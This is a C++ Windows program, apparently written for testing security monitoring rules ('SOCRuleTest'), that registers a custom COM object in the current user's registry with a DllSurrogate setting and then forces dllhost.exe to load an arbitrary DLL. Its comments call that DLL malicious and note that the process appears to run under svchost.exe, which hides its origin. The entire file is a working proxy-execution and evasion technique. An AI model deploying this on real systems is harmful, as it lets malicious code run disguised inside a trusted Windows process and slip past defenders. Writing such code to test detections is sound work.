#include<windows.h>
#include<objbase.h>
#include<iostream>
#include<string>
#include<filesystem>

// {F00DBABA-1002-2026-1337-133713371337} is the custom CLSID for our COM object.
// In a real implementation, you would generate a unique CLSID using a tool like uuidgen.
static const wchar_t* CLSID_STR = L"{F00DBABA-1002-2026-1337-133713371337}";


// Helper function to set a Windows registry key value.
bool SetRegistryKey(HKEY root, const std::wstring& key, const std::wstring& name, const std::wstring& value) {
	HKEY hKey;

	// Create or open the registry key
	// REG_OPTION_VOLATILE means the key will be deleted when the system restarts, which is useful for temporary COM registrations.
	// KEY_WRITE is the access right needed to set values in the registry key.
	// If the key cannot be created or opened, the function returns false.
	if (RegCreateKeyEx(root, key.c_str(), 0, NULL, 
		REG_OPTION_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
		return false;
	}


	// Set the default value of the key to the provided value. If 'name' is empty, it sets the default value.
	// The value is stored as a REG_SZ (string) type.
	// The size of the value is calculated as the length of the string plus one for the null terminator, multiplied by the size of a wchar_t.
	// If setting the registry value fails, we close the key handle and return false.
	if (RegSetValueEx(hKey, name.empty() ? NULL : name.c_str(), 
		0, REG_SZ, 
		reinterpret_cast<const BYTE*>(value.c_str()), 
		DWORD((value.size() + 1) * sizeof(wchar_t))) != ERROR_SUCCESS) {
		RegCloseKey(hKey);
		return false;
	}

	RegCloseKey(hKey);
	return true;
}

int wmain(int argc, wchar_t* argv[]) {

	
	// Check if the user provided the path to the DLL as a command-line argument.
	if (argc < 2) {
		std::wcout << L"Usage: " << argv[0] << L" <path_to_dll>\n";
		std::wcout << L"Example: " << argv[0] << L" C:\\Users\\Public\\SOCRuleTest.dll\n";
		return 1;
	}

	// Resolve the absolute path of the DLL provided by the user.
	// This ensures that the registry points to a valid location.
	std::wstring rawDllPath = argv[1];
	std::wstring DllPath;

	// Use std::filesystem to resolve the absolute path of the DLL.
	// If the path is invalid, catch the exception and print an error message.
	try {
		DllPath = std::filesystem::absolute(rawDllPath).wstring();
	}

	catch (const std::exception& e) {
		std::wcerr << L"[-] Error resolving DLL path\n";
		return 1;
	}

	
		// STEP 1: Create AppID registry key for DLL Surrogate Configuration.
	// The AppID key is used to specify the DLL surrogate for our COM object.
	std::wstring AppIDKey = LR"(Software\\Classes\\AppID\\)" + std::wstring(CLSID_STR);

	// Set the default value of the AppID key to "SOCRuleTest" and the "DllSurrogate" value to an empty string (triggers default dllhost.exe).
	// This configuration tells the system to use the DLL surrogate for our COM object.
	if (!SetRegistryKey(HKEY_CURRENT_USER, AppIDKey, L"", L"SOCRuleTest") || 
		!SetRegistryKey(HKEY_CURRENT_USER, AppIDKey, L"DllSurrogate", L"")) {
		std::wcerr << L"[-] AppID Registry Failed\n";
		return 1;
	}

	std::wcout << L"[+] AppID Registry for COM Surrogate set successfully.\n";

	
	
	// STEP 2: Create CLSID registry key for COM Object
	// The CLSID key is used to register our COM object and link it to the AppID.
	std::wstring CLSIDKey = LR"(Software\\Classes\\CLSID\\)" + std::wstring(CLSID_STR);
	std::wstring InprocServer32Key = CLSIDKey + LR"(\InprocServer32)";

	if(!SetRegistryKey(HKEY_CURRENT_USER, CLSIDKey, L"", L"SOCRuleTest") || // COM Object Name
		!SetRegistryKey(HKEY_CURRENT_USER, CLSIDKey, L"AppID", CLSID_STR) || // Link COM Object to AppID
		!SetRegistryKey(HKEY_CURRENT_USER, InprocServer32Key, L"", DllPath) || // Set the default value of InprocServer32 to the path of DLL
		!SetRegistryKey(HKEY_CURRENT_USER, InprocServer32Key, L"ThreadingModel", L"Apartment")) { // Set ThreadingModel to Apartment
		std::wcerr << L"[-] CLSID Registry Failed\n";
		return 1;
	}

	std::wcout << L"[+] CLSID Registry for COM Object set successfully.\n";



	// STEP 3: Initialize COM Susbystem in the current process.
	// CoInitializeEx is called with COINIT_APARTMENTTHREADED to initialize the COM library for use in a single-threaded apartment (STA) model.
	// This is necessary for COM operations to work correctly in the current process.
	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	if (FAILED(hr)) {
		std::wcerr << L"[-] CoInitializeEx failed: 0x" << std::hex << hr << L"\n";
		return 1;
	}

	
	
	// STEP 4: Convert the CLSID string to a CLSID structure.
	// CLSIDFromString is used to convert the string representation of the CLSID into a CLSID structure that can be used in COM operations
	CLSID clsid;
	hr = CLSIDFromString(const_cast<LPCWSTR>(CLSID_STR), &clsid);
	if(FAILED(hr)) {
		std::wcerr << L"[-] CLSIDFromString failed: 0x" << std::hex << hr << L"\n";
		CoUninitialize();
		return 1;
	}


	// STEP 5: Create an instance of the COM object using CoCreateInstance.
	// CoCreateInstance is called with the CLSID of our COM object
	
	// THE MAGIC HAPPENS HERE!
	// CLSCTX_LOCAL_SERVER forces Windows to:
	// 1. Look up our CLSID in the registry
	// 2. Find the DllSurrogate entry
	// 3. Launch dllhost.exe as a surrogate process
	// 4. Load our malicious DLL into dllhost.exe
	// 5. The parent process appears as svchost.exe
	
	IUnknown* pUnknown;
	hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, IID_IUnknown, (void**)&pUnknown); 
	// CLSCTX_LOCAL_SERVER is used to specify that the COM object should be created in a separate process (dllhost.exe) as a surrogate.

	
	// Clean up COM subsystem before exiting.
	CoUninitialize();

	
	// At this point, if everything succeeded, the DLL should be loaded into a dllhost.exe process with svchost.exe as the parent process.
	return 0;
}